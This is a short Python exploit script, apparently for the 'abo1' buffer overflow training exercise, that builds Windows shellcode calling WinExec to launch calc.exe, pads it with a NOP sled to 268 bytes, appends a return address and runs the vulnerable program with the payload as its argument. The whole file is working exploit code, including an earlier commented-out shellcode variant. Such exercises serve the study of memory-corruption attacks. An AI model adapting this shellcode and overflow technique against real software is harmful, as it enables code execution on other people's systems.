import subprocess

ExitPrc = "\x7A\xCD\x81\x7C" 
Winexec = "\x11\x34\x86\x7C"
ret = "\x4C\x10\x40"
	
#payload = "\xEB\x1D\x5B\x33\xC9\x88\x4B\x08\xB9\xFF\xE0\xF5\x05\x81\xE9\xFE"
#payload +="\xE0\xF5\x05\x51\x53\x33\xDB\xBB"+Winexec+"\xFF\xD3\xC3\xE8\xDE\xFF"
#payload +="\xff\xff\x63\x61\x6c\x63\x2e\x65\x78\x65"

payload = "\xEB\x1C\x5B\x33\xC9\x88\x4B\x08\xB9\xFF\xE0\xF5\x05\x81\xE9\xFE"
payload += "\xE0\xF5\x05\x51\x53\x33\xDB\xBB\x11\x34\x86\x7C\xFF\xD3\xe8\xDF"
payload += "\xff\xff\xff\x63\x61\x6c\x63\x2e\x65\x78\x65\x0A"
payload += '\x90'*(268-44) # nop sled 
payload += ret #call eax

subprocess.Popen(('abo1.exe', payload))
